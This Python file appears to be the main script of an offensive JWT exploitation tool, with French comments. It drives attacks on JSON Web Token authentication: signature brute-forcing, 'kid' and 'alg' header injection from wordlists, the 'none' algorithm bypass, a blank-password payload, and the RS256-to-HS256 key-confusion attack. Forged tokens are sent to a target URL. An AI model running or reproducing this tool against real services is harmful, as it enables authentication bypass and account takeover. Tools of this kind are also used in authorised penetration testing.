import arg_parser
import visual
import analyzer
import crypto
import requestor
import modifier
import sys
import json 
######RESTE A FAIRE : Prise en charge de tous les algos / Headers Injection / fuzzing + wordlist / désactivation option des requêtes
def analyze(args) :
    print(visual.title("START Analyze"))
    print("HEADERS : " + analyzer.get_header_json(args.token))
    print("PAYLOAD : " + analyzer.get_playload_json(args.token))
    analyzer.get_exploit(args)
    print(visual.title("END Analyze"))
    return

def bruteforce(args) :
    print(visual.title("START BruteForce"))
    print(crypto.crack_signature(args))
    print(visual.title("END BruteForce"))
    return

def kid_injection(args) :
    print(visual.title("START Kid Injection"))
    try : 
        with open(args.wordlist, "r") as file :
            words = [word.rstrip('\n') for word in file.readlines()]
    except Exception as e :
        print(visual.error("Wordlist : " + str(e)))
        sys.exit()
    if args.construct :
        try :
            header_base_dict = json.loads(args.head.replace(" ", ""))
        except Exception as e :
            print(visual.error(str(e)))
            sys.exit()
    else :
        header_base_dict = analyzer.get_header_args(args.token)
    to_dump = ""
    print(header_base_dict)
    for word in words :
        print("Kid : " + word)
        header_base_dict["kid"] = word
        try :
            current_header_json = json.dumps(header_base_dict)
        except Exception as e :
            print(visual.error(str(e)))
            sys.exit()
        args.head = current_header_json
        current_token = crypto.create_token(args)
        if args.url is not None :
            if args.post :
                requestor.request_post(args, current_token)
            else :
                requestor.request_get(args, current_token)
        else :
            to_dump += "Kid : " + current_token + "\n"
        print("\r")
    if args.url is None :
        try :
            with open(args.output, "w") as file:
                file.write(to_dump)
        except Exception as e :
            print(visual.error(str(e)))
            sys.exit()
    print(visual.title("START END Injection"))
    return

def none_algo(args) :
    print(visual.title("START none algo exploit"))
    new_token = modifier.none_algo(args.token)
    print(visual.green("Algo changed to none : ") + analyzer.get_header_json(new_token))
    if args.url is not None :
        if args.post :
            request = requestor.request_post(args, new_token)
        else :
            request = requestor.request_get(args, new_token)
    print(new_token)
    print(visual.title("END none algo exploit"))

def blank_password(args) :
    print(visual.title("START blank password exploit"))
    args.playload = "{\"password\" : \"\"}"
    args.token = modifier.add_in_playload(args)
    args.play = analyzer.get_playload_json(args.token)
    args.head = analyzer.get_header_json(args.token)
    if args.secret_key is not None :
        args.token = crypto.create_token(args)
        print(args.token)
    if args.post :
        request = requestor.request_post(args, args.token)
    else :
        request = requestor.request_get(args, args.token)
    print(visual.title("END blank password exploit"))
    True

def construct(args) :
    print(visual.title("START CONSTRUCTION"))
    print(crypto.create_token(args))
    print(visual.title("END CONSTRUCTION"))

def mismatch(args) :
    print(visual.title("START MISMATCH RS->HS ATTACK"))
    if analyzer.get_algo(args.token) != "RS256" and analyzer.get_algo(args.token) != "RS512" :
        print(visual.error("Algorithm in header need to be RS256 or RS512"))
        sys.exit()
    old_header = analyzer.get_header_json(args.token)
    new_header_json = modifier.mismatch_header_json(old_header)
    args.head = new_header_json
    args.play = analyzer.get_playload_json(args.token)
    args.secret_key = args.public_key
    print("Création du nouveau token avec la clé publique " + args.secret_key)
    new_token = crypto.create_token(args)
    print(new_token)
    if args.url is not None and args.post :
        requestor.request_post(args, new_token)
    elif args.url is not None:
        requestor.request_get(args, new_token)
    print(visual.title("END MISMATCH RS->HS ATTACK"))

def alg_injection(args) :
    print(visual.title("START ALG INJECTION"))
    try :
        with open(args.wordlist, "r") as file :
            words = [word.rstrip('\n') for word in file.readlines()]
    except Exception as e : 
        print(visual.error(str(e)))
        sys.exit()
    to_dump =""
    playload_64 = analyzer.get_playload_64(args.token)
    signature_64 = analyzer.get_signature_64(args.token)
    for word in words :
        try :
            current_header_dict = analyzer.get_header_args(args.token)
            current_header_dict["alg"] = word 
            args.head = json.dumps(current_header_dict) 
            current_header_64 = modifier.new_header_64(args)
            current_token = current_header_64 + "." + playload_64 + "." + signature_64
            if args.url is not None :
                if args.post :
                    requestor.request_post(args, current_token)
                else :
                    requestor.request_get(args, current_token)
            else :
                to_dump += word + " : " + current_token + "\n\n"
        except Exception as e :
            print(visual.error(str(e)))
            sys.exit()
        print(word + " : " + current_token + "\n")
    if args.url is None :
        try :
            with open(args.output, "w") as file :
                file.write(to_dump)
        except Exception as e:
            print(visual.error(str(e)))
            sys.exit()
    print(visual.title("END ALG INJECTION"))

def empty_file(filename) :
    try :
        with open(filename, "w") as file :
            file.write("")
    except Exception as e :
        print(visual.error(str(e)))

def main() :
    args = arg_parser.get_args()
    if args.output is not None :
        empty_file(args.output)            
    if args.construct :
        args.token = crypto.create_token(args)
    if args.bruteforce :
        retour = bruteforce(args)
    elif args.playload is not None or args.new_playload is not None :
        args.token = modifier.add_in_playload(args)
        print(visual.green("Modification playload done : ") + analyzer.get_playload_json(args.token))
    elif args.kid :
        retour = kid_injection(args)
    elif args.none_alg :
        retour = none_algo(args)
    elif args.blank :
        retour = blank_password(args)
    elif args.mismatch :
        retour = mismatch(args)
    elif args.alg_injection :
        retour = alg_injection(args)
    elif args.construct :
        retour = construct(args)
    else : 
        retour = analyze(args)
    return

if __name__ == '__main__' :
    main()
    